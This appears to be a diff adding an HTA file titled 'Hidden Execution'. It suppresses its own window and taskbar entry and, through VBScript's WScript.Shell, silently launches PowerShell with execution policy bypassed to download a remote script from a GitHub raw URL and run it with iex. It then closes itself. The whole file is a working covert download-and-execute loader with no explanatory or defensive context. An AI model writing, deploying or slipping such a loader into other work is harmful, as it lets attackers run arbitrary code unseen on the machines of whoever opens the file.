@@ -1,0 +1,21 @@
+<html>
+<head>
+    <title>Hidden Execution</title>
+    <HTA:APPLICATION
+        APPLICATIONNAME="HiddenExecution"
+        BORDER="none"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+    />
+    <script language="VBScript">
+        Dim objShell
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "powershell -ExecutionPolicy Bypass -NoProfile -Command ""iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/toyan13/Learn-Python-Ethical-Hacking-From-Scratch/main/test1.ps1'))""", 0, True
+        Set objShell = Nothing
+        window.close
+    </script>
+</head>
+<body>
+</body>
+</html>
